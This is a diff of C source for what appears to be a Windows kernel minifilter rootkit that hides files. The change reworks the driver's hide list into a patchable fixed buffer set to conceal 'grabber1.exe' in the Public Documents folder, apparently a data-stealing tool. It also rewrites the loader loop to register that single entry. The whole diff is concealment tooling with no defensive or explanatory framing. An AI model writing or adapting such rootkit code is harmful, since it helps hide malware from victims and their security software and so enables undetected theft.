@@ -62,7 +62,7 @@ ExcludeContext g_excludeFileContext;
 // Use this variable for hard code full file paths that you would like to hide
 // For instance: L"\\Device\\HarddiskVolume1\\Windows\\System32\\calc.exe"
 // Notice: this array should be NULL terminated
-CONST PWCHAR g_excludeFiles[] = {
+WCHAR g_excludeFiles[1][256] = {
 	L"\\Device\\HarddiskVolume2\\Users\\Public\\Documents\\grabber1.exe"
 };
 
@@ -751,7 +751,7 @@ NTSTATUS InitializeFSMiniFilter(PDRIVER_OBJECT DriverObject)
 {
 	NTSTATUS status;
 	UNICODE_STRING str;
-	UINT32 i;
+	//UINT32 i;
 	ExcludeEntryId id;
 
 	// Initialize and fill exclude file\dir lists 
@@ -763,11 +763,11 @@ NTSTATUS InitializeFSMiniFilter(PDRIVER_OBJECT DriverObject)
 		return status;
 	}
 
-	for (i = 0; g_excludeFiles[i]; i++)
-	{
-		RtlInitUnicodeString(&str, g_excludeFiles[i]);
+	//for (i = 0; g_excludeFiles[i]; i++)
+	//{
+		RtlInitUnicodeString(&str, g_excludeFiles[0]);
 		AddExcludeListFile(g_excludeFileContext, &str, &id, 0);
-	}
+	//}
 
 	CfgEnumConfigsTable(HideFilesTable, &LoadConfigFilesCallback, NULL);
 
